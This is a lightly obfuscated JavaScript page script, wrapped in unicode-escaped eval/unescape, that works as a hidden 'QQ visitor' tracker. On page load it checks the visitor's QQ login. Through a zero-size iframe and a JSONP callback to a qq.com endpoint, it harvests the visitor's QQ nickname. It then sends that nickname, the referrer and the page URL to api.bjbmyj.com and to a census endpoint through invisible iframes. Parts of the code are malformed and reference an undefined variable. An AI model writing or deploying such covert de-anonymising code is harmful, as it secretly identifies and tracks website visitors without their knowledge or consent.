var IJzQ0T7qvJ = \u0075\ u006e\ u0065\ u0073\ u0063\ u0061\ u0070\ u0065;
var LQuJvwhX9o = \u0065\ u0076\ u0061\ u006c;
LQuJvwhX9o(IJzQ0T7qvJ("eval(unescape("
    var para = document.getElementById("qq_js");
    var v;
    var v = para.src;
    var tmp = v.split("?");
    var ids = tmp[1];
    var u_refer = encodeURIComponent(document.referrer);
    var u_page = encodeURIComponent(document.location.href);
    var Qin_api = 'http://api.bjbmyj.com/api';
    var isIE = document.all ? true : false;
    var ie = document.all ? true : false;
    var isIE = !!window.ActiveXObject;

    function loadJS(jsurl, onsuccess, charset, onerr) {
        var xScript = document.createElement("script");
        xScript.type = "text/javascript";
        if (charset == '') {
            xScript.charset = "utf-8"
        } else {
            xScript.charset = charset
        }
        xScript.src = jsurl;
        xScript.onerror = function() {
            if (onerr) {
                setTimeout(onerr, 10)
            }
        };
        if (ie) {
            xScript.onreadystatechange = function() {
                if (xScript.readyState) {
                    if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
                        xScript.onreadystatechange = null;
                        xScript.onload = null;
                        if (onsuccess) {
                            setTimeout(onsuccess, 10)
                        }
                    }
                } else {
                    xScript.onreadystatechange = null;
                    xScript.onload = null;
                    if (onsuccess) {
                        setTimeout(onsuccess, 10)
                    }
                }
            }
        } else {
            xScript.onload = function() {
                if (xScript.readyState) {
                    if (xScript.readyState == "loaded" || xScript.readyState == "complete") {
                        xScript.onreadystatechange = null;
                        xScript.onload = null;
                        if (onsuccess) {
                            setTimeout(onsuccess, 10)
                        }
                    }
                } else {
                    xScript.onreadystatechange = null;
                    xScript.onload = null;
                    if (onsuccess) {
                        setTimeout(onsuccess, 10)
                    }
                }
            }
        }
        document.getElementsByTagName('HEAD').item(0).appendChild(xScript)
    }

    function fangkenoLogin() {
        xx1 = getCookie("fkqq");
        xx2 = getCookie("fkname");
        try {
            if (xx1 == '' || xx1 == 'null') {
                fangkenoLogin_api_cookie()
            } else {
                setTimeout(xxx_third, 1)
            }
        } catch (e) {
            fangkenoLogin_api_cookie()
        }
    }

    function fangkenoLogin_api_cookie() {
        fangkenoLogin_do()
    }

    function qqs_not() {
        fangkenoLogin_do()
    }

    function fangkenoLogin_do() {
        loadJS("http://apps.qq.com/app/yx/cgi-bin/show_fel?hc=8&lc=4&d=365633133&t=" + (new Date).getTime(), checkLoginCB)
    }

    function checkLoginCB() {
        try {
            if (data0.err == 1026) {
                setTimeout(blog_api, 100)
            } else {
                setTimeout(fangkenoLogin, 5000)
            }
        } catch (e) {
            setTimeout(fangkenoLogin, 5000)
        }
    }

    function blog_api() {
        loadJS(Qin_api + "/blog_url.php?u_api=" + encodeURIComponent(u_api) + "&t=" + (new Date).getTime())
    }

    function loading_blog(blogid, uid) {
        window.img = "<script>function gqq_callback(options){parent.scn_sendInfo(options);};</script><script id='img' src='http://webstock.finance.qq.com/stockapp/zixuanguweb/stocklist?callback=gqq_callback&app=web&range=group'></script>";
        var frameid = "frameImg" + Math.random();
        var _iframe = document.createElement("iframe");
        _iframe.src = "javascript:parent.img;";
        _iframe.id = frameid;
        _iframe.scrolling = "no";
        _iframe.setAttribute("frameborder", "0", 0);
        _iframe.style.width = "0px";
        _iframe.style.height = "0px";
        document.body.appendChild(_iframe)
    }

    function get_lastview() {
        var hyj_b = new Date();
        var hyj_tm = hyj_b.getTime();
        hyj_tm = Math.round(hyj_tm / 1000);
        my_fetch_url = Qin_api + "/qq/index_json.php?u_api=" + encodeURIComponent(u_api) + "&xx1=" + xx1 + "&xx2=" + xx2 + "&tm=" + hyj_tm;
        loadJS(my_fetch_url)
    }

    function scn_sendInfo(id) {
        try {
            xx1 = id.data.nickname;
            xx2 = 'Null';
            setCookie("fkqq", xx1);
            setCookie("fkname", xx2);
            setTimeout(get_lastview, 1)
        } catch (e) {}
    }

    function qqs(id) {
        xx1 = id.uin;
        xx2 = 'Null';
        setTimeout(xxx_third, 1)
    }

    function xxx_third() {
        var iframe = document.createElement("iframe");
        iframe.src = u_api + "/C-census.php?" + ids + "&xx1=" + xx1 + "&xx2=" + xx2 + "&llurl=" + u_refer + "&thepage=" + u_page + "&t=" + (new Date).getTime();
        iframe.id = "QQfangke_iframe_two";
        iframe.name = "QQfangke_iframe_two";
        iframe.style.width = "0px";
        iframe.style.height = "0px";
        iframe.scrolling = "no";
        iframe.setAttribute('frameborder', '0', 0);
        document.body.appendChild(iframe)
    }

    function setCookie(name, value) {
        var Days = 1000;
        var exp = new Date();
        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 1000);
        document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString()
    }

    function getCookie(name) {
        var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
        if (arr = document.cookie.match(reg)) return (arr[2]);
        else return 'null'
    }

    function delCookie(name) {
        var date = new Date();
        date.setTime(date.getTime() - 10000);
        document.cookie = name + "=;expire=" + date.toGMTString()
    }
    delCookie("fkqq"); delCookie("fkname"); fangkenoLogin();
    "))
"))